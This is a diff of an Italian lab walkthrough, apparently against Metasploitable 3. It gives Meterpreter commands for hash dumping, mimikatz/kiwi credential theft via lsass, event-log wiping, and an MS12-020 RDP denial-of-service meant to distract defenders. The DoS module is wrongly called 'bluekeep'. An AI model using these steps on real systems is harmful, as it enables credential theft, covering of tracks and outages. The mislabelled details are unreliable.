@@ -22,7 +22,8 @@ L'attacco è stato eseguito seguendo diverse fasi chiave:
 
 8)**Eliminazione tracce**: Cerchiamo di eliminare quante piu tracce possibli.
 
-(8)a)cerco file sensibili b)faccio attacco dos e sviare attenzione c)attacco alcuni database per ottenere ulteriori credenziali(mysql)
+9)**Attacco Dos**: Eseguiamo un attacco dos dopo aver rubato le credenziali, in questo modo cerchiamo di sviare il difensore da quanto accaduto concentrando le sue risorse su questo attacco.
+
 ## Scansione della rete
 
 ### a)Identificazione dell'Indirizzo IP e della Netmask
@@ -121,17 +122,17 @@ Abbiamo ottenuto una sessione meterpeter sulla macchina.
 Digitare  ```hashdump``` e salvare le password su file credenzialiSAM.txt.
 
 #### Considerazioni
-Posso conservare queste password per tentare un attacco di forza bruta offline e scoprire le password di ogni utente, per eventualmente tentare un movimento laterale o accedere a qualche sito web.
+Posso conservare queste password per tentare un attacco di forza bruta offline e scoprire le password in chiaro di ogni utente, per eventualmente tentare un movimento laterale o accedere a qualche sito web. Posso anche conservare queste credenziali per tentare un pass the hash.
 
-## Utilizzo di Mimikatz
+## Utilizzo di Kiwi (mimikatz)
 
 **1)Aprire Mimikatz**: Digitare ```load kiwi``` nella sessione meterpeter.
 
 **2)Elencare processi**: Digitare ```ps``` nella sessione meterpeter per visualizzare tutti i processi attivi e sceglierne uno con i giusti privilegi.
 
-**3)Spostarsi nel processo**: Digitare ```migrate 'pid scelto'``` nella sessione meterpeter.
+**3)Spostarsi nel processo**: Digitare ```migrate 'pid scelto'``` nella sessione meterpeter. (es scegliamo il pid del processo lssa).
 
-**4)Rubare le credenziali**: Digitare ```creds_all``` nella sessione meterpeter.
+**4)Rubare le credenziali**: Digitare ```creds_all``` nella sessione meterpeter per ottenere tutte le credenziali disponibili.
 
 #### Osservazine
 Per qualche motivo eseguendo meterpeter su *powershell.exe* kiwi ovvero mimikatz non funziona (osservando i processi la cosa che cambia e l'archittetura).
@@ -160,11 +161,29 @@ A questo punto seguiamo questa procedura per scaricare le credenziali disponibli
 **5)** Salviamo le credenziali su un file nel nostro pc.
 
 
-
-
-
 ## Eliminazione tracce
 **1)Eliminazione logs**: Eliminare i logs digitando il comando: ```clearev``` nella sessione meterpreter.
+
+## Attacco DOS
+
+**1)Aprire Metasploit**: Aprire il terminale e digitare il comando per avviare Metasploit:```msfconsole```.
+
+**2)Caricare il modulo**: Una volta aperto Metasploit, caricare il modulo ```auxiliary/scanner/rdp/ms12_020_check``` per vedere se la macchina è vulnerabile a questo attacco.
+
+**3)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```
+
+**4)Lanciare il modulo**: eseguire ```run``` .
+
+Se il la macchina è vulnerabile proseguire.
+
+**5)Caricare il modulo bluekeep**: Una volta aperto Metasploit, caricare il modulo ```dos/windows/rdp/ms12_020_maxchannelids```.
+
+**6)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```
+
+**4)Lanciare il modulo**: eseguire ```run``` .
+
+##### Riferimenti:
+https://tremblinguterus.blogspot.com/2020/11/metasploitable-3-windows-walkthrough_88.html?m=1
 
 
 
